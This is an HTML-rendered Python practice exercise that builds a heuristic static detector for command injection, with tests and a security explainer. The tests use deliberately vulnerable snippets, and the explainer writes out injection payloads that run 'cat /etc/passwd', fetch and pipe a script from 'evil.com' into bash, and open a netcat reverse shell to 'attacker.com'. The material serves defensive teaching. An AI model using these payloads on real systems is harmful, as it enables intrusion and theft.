@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>q50_cmdi_static_detector.py</title>
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      color: #24292f;
+      background: #fff;
+    }
+    h1 {
+      font-size: 1.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      margin-bottom: 0.6em;
+    }
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 16px;
+      font-family: monospace;
+    }
+    .line-count {
+      font-size: 0.78em;
+      color: #8c959f;
+      margin-bottom: 16px;
+    }
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+      counter-reset: line;
+    }
+    code {
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.88em;
+    }
+  </style>
+</head>
+<body>
+  <h1>q50_cmdi_static_detector.py</h1>
+  <p class="file-path">Source: code\practice\hard\q50_cmdi_static_detector.py</p>
+  <p class="line-count">405 lines</p>
+  <pre><code class="language-python">&quot;&quot;&quot;
+=============================================================================
+Q50 [Hard] — Command Injection Static Pattern Detector
+=============================================================================
+
+PROBLEM
+-------
+Build a static analyzer for unsafe shell command construction:
+  1. User-controlled input passed to os.system, subprocess.run/call/Popen,
+     exec(), eval(), os.popen, shell=True with user data.
+  2. String concatenation/interpolation to build shell commands.
+  3. JavaScript: exec(), spawn(), child_process, eval().
+  4. Taint tracking: user source → shell sink.
+
+CLARIFYING QUESTIONS
+--------------------
+1. Languages? → Python, JavaScript, Java-like.
+2. What is &quot;safe&quot;?
+   → subprocess.run([&quot;cmd&quot;, arg]) with list form (no shell=True),
+     shlex.quote() applied to all user inputs,
+     no shell=True, no os.system.
+3. Severity levels?
+   → HIGH: direct user input in shell sink; MEDIUM: dynamic expression;
+     LOW: shell=True with no visible user input.
+4. Output? → Structured findings.
+
+=============================================================================
+APPROACH 1 — NAIVE
+=============================================================================
+  Flag every os.system / subprocess call. Too many false positives.
+
+=============================================================================
+APPROACH 2 — TAINT-AWARE DETECTOR WITH SAFE-LIST SUPPRESSION (OPTIMAL)
+=============================================================================
+  Same 3-pass architecture as Q49:
+  1. Collect tainted variables.
+  2. Collect command-string variables built from tainted sources.
+  3. Flag sinks with tainted variables or dynamic expressions.
+  4. Suppress when shlex.quote() / shlex.split() / list-form detected.
+
+=============================================================================
+&quot;&quot;&quot;
+
+from __future__ import annotations
+
+import re
+from dataclasses import dataclass, field
+from typing import Dict, List, Optional, Set, Tuple
+
+
+# ---------------------------------------------------------------------------
+# Data Types
+# ---------------------------------------------------------------------------
+
+@dataclass
+class CmdiFinding:
+    file: str
+    line_number: int
+    severity: str
+    rule_name: str
+    evidence: str
+    line_preview: str
+
+    def __str__(self) -&gt; str:
+        return (
+            f&quot;[{self.severity.upper()}] {self.file}:{self.line_number} &quot;
+            f&quot;rule={self.rule_name!r}: {self.evidence[:60]}&quot;
+        )
+
+
+@dataclass
+class CmdiScanResult:
+    filename: str
+    findings: List[CmdiFinding] = field(default_factory=list)
+    lines_scanned: int = 0
+
+    @property
+    def has_findings(self) -&gt; bool:
+        return bool(self.findings)
+
+
+# ---------------------------------------------------------------------------
+# Patterns
+# ---------------------------------------------------------------------------
+
+_SOURCE_PATTERNS: List[Tuple[str, re.Pattern]] = [
+    (&quot;flask_args&quot;,  re.compile(r&quot;request\.(args|form|values|GET|POST|json)(\[|\.get\s*\()&quot;)),
+    (&quot;input_func&quot;,  re.compile(r&quot;\binput\s*\(&quot;)),
+    (&quot;sys_argv&quot;,    re.compile(r&quot;\bsys\.argv\b&quot;)),
+    (&quot;req_query&quot;,   re.compile(r&quot;req\.(query|body|params)\s*[\[.]&quot;)),
+    (&quot;cli_args&quot;,    re.compile(r&quot;\bargparse\b|\bclick\b&quot;)),
+    (&quot;env_var&quot;,     re.compile(r&quot;os\.environ\.get|os\.getenv&quot;)),
+]
+
+_SHELL_SINKS: List[Tuple[str, re.Pattern]] = [
+    (&quot;os_system&quot;,       re.compile(r&quot;\bos\.system\s*\(&quot;)),
+    (&quot;os_popen&quot;,        re.compile(r&quot;\bos\.popen\s*\(&quot;)),
+    (&quot;popen2&quot;,          re.compile(r&quot;\bpopen2?\s*\(&quot;)),
+    (&quot;subprocess_run&quot;,  re.compile(r&quot;\bsubprocess\.(run|call|check_output|check_call)\s*\(&quot;)),
+    (&quot;subprocess_popen&quot;,re.compile(r&quot;\bsubprocess\.Popen\s*\(&quot;)),
+    (&quot;eval_exec&quot;,       re.compile(r&quot;\b(eval|exec)\s*\(&quot;)),
+    (&quot;js_exec&quot;,         re.compile(r&quot;\bexec\s*\(&quot;)),
+    (&quot;child_process&quot;,   re.compile(r&quot;child_process\.(exec|spawn|execSync)\s*\(&quot;)),
+    (&quot;runtime_exec&quot;,    re.compile(r&quot;Runtime\.getRuntime\(\)\.exec\s*\(&quot;)),
+]
+
+# Dangerous shell=True or string-form indicators
+_SHELL_TRUE = re.compile(r&quot;shell\s*=\s*True&quot;)
+_DYN_EXPR   = re.compile(r&#x27;f[&quot;\&#x27;]|\+\s*\w|\w\s*\+|%\s*(?:\w|[(\[])|\.format\s*\(|\$\{|\$\(&#x27;)
+
+# Safe patterns
+_SAFE_PATTERNS: List[re.Pattern] = [
+    re.compile(r&quot;shlex\.quote\s*\(&quot;),            # safe quoting
+    re.compile(r&quot;shlex\.split\s*\(&quot;),            # tokenize safely
+    re.compile(r&quot;subprocess\.\w+\s*\(\s*\[&quot;),   # list-form arg
+    re.compile(r&quot;^\s*#&quot;),                        # comment
+    re.compile(r&quot;#\s*(nosec|noqa|safe)&quot;),
+]
+
+_VAR_FROM_SOURCE = re.compile(
+    r&quot;^\s*(\w+)\s*=\s*.*(?:request\.|req\.|input\(|sys\.argv|getenv|environ)&quot;,
+    re.IGNORECASE,
+)
+_CMD_VAR_ASSIGN = re.compile(
+    r&quot;^\s*(\w+)\s*=\s*.*(?:sh|cmd|command|exec|run|shell)&quot;,
+    re.IGNORECASE,
+)
+
+
+def _line_is_safe(line: str) -&gt; bool:
+    return any(p.search(line) for p in _SAFE_PATTERNS)
+
+
+def _source_on_line(line: str) -&gt; Optional[str]:
+    for name, pat in _SOURCE_PATTERNS:
+        if pat.search(line):
+            return name
+    return None
+
+
+def _sink_on_line(line: str) -&gt; Optional[Tuple[str, str]]:
+    for name, pat in _SHELL_SINKS:
+        m = pat.search(line)
+        if m:
+            return name, m.group(0)
+    return None
+
+
+# ---------------------------------------------------------------------------
+# APPROACH 1 — Naive
+# ---------------------------------------------------------------------------
+
+def detect_naive(code: str) -&gt; List[str]:
+    results = []
+    for i, line in enumerate(code.splitlines(), 1):
+        if re.search(r&quot;os\.system|subprocess|exec\(&quot;, line):
+            results.append(f&quot;Line {i}: {line.strip()}&quot;)
+    return results
+
+
+# ---------------------------------------------------------------------------
+# APPROACH 2 — Taint-aware detector
+# ---------------------------------------------------------------------------
+
+class CmdInjectionDetector:
+    &quot;&quot;&quot;
+    Heuristic command injection static detector.
+    &quot;&quot;&quot;
+
+    def detect(self, code: str, filename: str = &quot;&lt;code&gt;&quot;) -&gt; CmdiScanResult:
+        result = CmdiScanResult(filename=filename)
+        lines  = code.splitlines()
+        result.lines_scanned = len(lines)
+
+        # Pass 1: tainted variables
+        tainted: Set[str] = set()
+        for line in lines:
+            m = _VAR_FROM_SOURCE.match(line)
+            if m:
+                tainted.add(m.group(1))
+
+        # Pass 2: command string variables
+        cmd_vars: Dict[str, bool] = {}   # var → is_tainted
+        for line in lines:
+            m = _CMD_VAR_ASSIGN.match(line)
+            if m:
+                var = m.group(1)
+                is_tainted_cmd = any(
+                    re.search(r&#x27;\b&#x27; + re.escape(tv) + r&#x27;\b&#x27;, line) for tv in tainted
+                )
+                cmd_vars[var] = is_tainted_cmd
+
+        # Pass 3: find sinks
+        for line_idx, line in enumerate(lines, start=1):
+            if _line_is_safe(line):
+                continue
+
+            sink = _sink_on_line(line)
+            if sink is None:
+                continue
+
+            sink_name, sink_text = sink
+
+            # Direct source in sink
+            src = _source_on_line(line)
+            if src:
+                result.findings.append(CmdiFinding(
+                    file=filename, line_number=line_idx,
+                    severity=&quot;high&quot;,
+                    rule_name=f&quot;{src}_to_{sink_name}&quot;,
+                    evidence=line.strip()[:80],
+                    line_preview=line.strip()[:100],
+                ))
+                continue
+
+            # Tainted var in sink
+            matched_tv = next(
+                (tv for tv in tainted
+                 if re.search(r&#x27;\b&#x27; + re.escape(tv) + r&#x27;\b&#x27;, line)),
+                None
+            )
+            if matched_tv:
+                result.findings.append(CmdiFinding(
+                    file=filename, line_number=line_idx,
+                    severity=&quot;high&quot;,
+                    rule_name=f&quot;tainted_var_{sink_name}&quot;,
+                    evidence=f&quot;var={matched_tv}&quot;,
+                    line_preview=line.strip()[:100],
+                ))
+                continue
+
+            # Tainted cmd var in sink
+            matched_cv = next(
+                (cv for cv, tainted_flag in cmd_vars.items()
+                 if tainted_flag and re.search(r&#x27;\b&#x27; + re.escape(cv) + r&#x27;\b&#x27;, line)),
+                None
+            )
+            if matched_cv:
+                result.findings.append(CmdiFinding(
+                    file=filename, line_number=line_idx,
+                    severity=&quot;high&quot;,
+                    rule_name=f&quot;tainted_cmd_var_{sink_name}&quot;,
+                    evidence=f&quot;cmd_var={matched_cv}&quot;,
+                    line_preview=line.strip()[:100],
+                ))
+                continue
+
+            # Dynamic expression with shell=True → medium
+            if _SHELL_TRUE.search(line) and _DYN_EXPR.search(line):
+                result.findings.append(CmdiFinding(
+                    file=filename, line_number=line_idx,
+                    severity=&quot;medium&quot;,
+                    rule_name=f&quot;shell_true_dynamic_{sink_name}&quot;,
+                    evidence=line.strip()[:80],
+                    line_preview=line.strip()[:100],
+                ))
+                continue
+
+            # shell=True at all (low) if untainted
+            if _SHELL_TRUE.search(line):
+                result.findings.append(CmdiFinding(
+                    file=filename, line_number=line_idx,
+                    severity=&quot;low&quot;,
+                    rule_name=f&quot;shell_true_{sink_name}&quot;,
+                    evidence=line.strip()[:80],
+                    line_preview=line.strip()[:100],
+                ))
+
+        return result
+
+
+# ---------------------------------------------------------------------------
+# Test Cases
+# ---------------------------------------------------------------------------
+
+def test_os_system_user_input():
+    code = &quot;&quot;&quot;
+import os
+from flask import request
+host = request.args.get(&quot;host&quot;)
+os.system(&quot;ping -c 1 &quot; + host)
+&quot;&quot;&quot;
+    d = CmdInjectionDetector()
+    r = d.detect(code, &quot;ping.py&quot;)
+    print(f&quot;os.system findings: {[str(f) for f in r.findings]}&quot;)
+    assert r.has_findings
+    high = [f for f in r.findings if f.severity == &quot;high&quot;]
+    assert high
+    print(&quot;os.system user input: passed&quot;)
+
+
+def test_subprocess_list_form_safe():
+    code = &quot;&quot;&quot;
+import subprocess
+host = &quot;192.168.1.1&quot;
+subprocess.run([&quot;ping&quot;, &quot;-c&quot;, &quot;1&quot;, host], timeout=5)
+&quot;&quot;&quot;
+    d = CmdInjectionDetector()
+    r = d.detect(code, &quot;safe.py&quot;)
+    assert not r.has_findings
+    print(&quot;subprocess list-form not flagged: passed&quot;)
+
+
+def test_shell_true_dynamic():
+    code = &quot;&quot;&quot;
+import subprocess
+filename = user_input
+subprocess.run(f&quot;cat {filename}&quot;, shell=True)
+&quot;&quot;&quot;
+    d = CmdInjectionDetector()
+    r = d.detect(code, &quot;shell_true.py&quot;)
+    print(f&quot;shell=True findings: {[str(f) for f in r.findings]}&quot;)
+    assert r.has_findings
+    print(&quot;shell=True dynamic: passed&quot;)
+
+
+def test_js_child_process():
+    code = &quot;&quot;&quot;
+const { exec } = require(&#x27;child_process&#x27;);
+const cmd = req.query.cmd;
+exec(cmd, (err, stdout) =&gt; { res.send(stdout); });
+&quot;&quot;&quot;
+    d = CmdInjectionDetector()
+    r = d.detect(code, &quot;server.js&quot;)
+    print(f&quot;JS child_process findings: {[str(f) for f in r.findings]}&quot;)
+    assert r.has_findings
+    print(&quot;JS child_process: passed&quot;)
+
+
+def test_shlex_quoted_safe():
+    code = &quot;&quot;&quot;
+import subprocess, shlex
+from flask import request
+filename = shlex.quote(request.args.get(&quot;file&quot;))
+subprocess.run([&quot;cat&quot;, filename])
+&quot;&quot;&quot;
+    d = CmdInjectionDetector()
+    r = d.detect(code, &quot;quoted.py&quot;)
+    # shlex.quote suppresses; list form also suppresses
+    high = [f for f in r.findings if f.severity == &quot;high&quot;]
+    assert not high
+    print(&quot;shlex.quote not flagged high: passed&quot;)
+
+
+def test_eval_injection():
+    code = &quot;&quot;&quot;
+from flask import request
+data = request.args.get(&quot;expr&quot;)
+result = eval(data)
+&quot;&quot;&quot;
+    d = CmdInjectionDetector()
+    r = d.detect(code, &quot;eval_test.py&quot;)
+    print(f&quot;eval findings: {[str(f) for f in r.findings]}&quot;)
+    assert r.has_findings
+    print(&quot;eval injection: passed&quot;)
+
+
+# ---------------------------------------------------------------------------
+# SECURITY ANGLE
+# ---------------------------------------------------------------------------
+&quot;&quot;&quot;
+COMMAND INJECTION — CWE-78 / OWASP A1
+---------------------------------------
+Root Cause: Unsanitized user input treated as OS shell command.
+
+CLASSIC ATTACKS
+----------------
+  ping -c 1 &lt;host&gt;  where host = &quot;8.8.8.8; cat /etc/passwd&quot;
+  Result: runs both ping AND cat /etc/passwd.
+
+  host = &quot;$(curl http://evil.com/shell.sh | bash)&quot;
+  host = &quot;| nc attacker.com 4444 -e /bin/sh&quot;
+
+PYTHON-SPECIFIC DANGERS
+------------------------
+  os.system(cmd)         → spawns shell; all metacharacters active.
+  subprocess(shell=True) → same as os.system.
+  eval(user_input)       → arbitrary Python execution.
+  exec(user_input)       → arbitrary Python execution.
+  __import__             → module loading via injection.
+
+SAFE ALTERNATIVES
+-----------------
+  subprocess.run([&quot;cmd&quot;, arg1, arg2])  → no shell; args not interpreted.
+  shlex.quote(arg)                     → escapes for POSIX shell.
+  Never use shell=True with user-controlled data.
+  Validate input against a strict allowlist before any command.
+
+DEFENSE IN DEPTH
+----------------
+  Drop privileges (non-root process).
+  SELinux/AppArmor policy restricts syscalls.
+  No outbound network access from compute nodes.
+  Audit log all exec() syscalls via auditd or eBPF.
+&quot;&quot;&quot;
+
+
+if __name__ == &quot;__main__&quot;:
+    test_os_system_user_input()
+    test_subprocess_list_form_safe()
+    test_shell_true_dynamic()
+    test_js_child_process()
+    test_shlex_quoted_safe()
+    test_eval_injection()
+</code></pre>
+</body>
+</html>
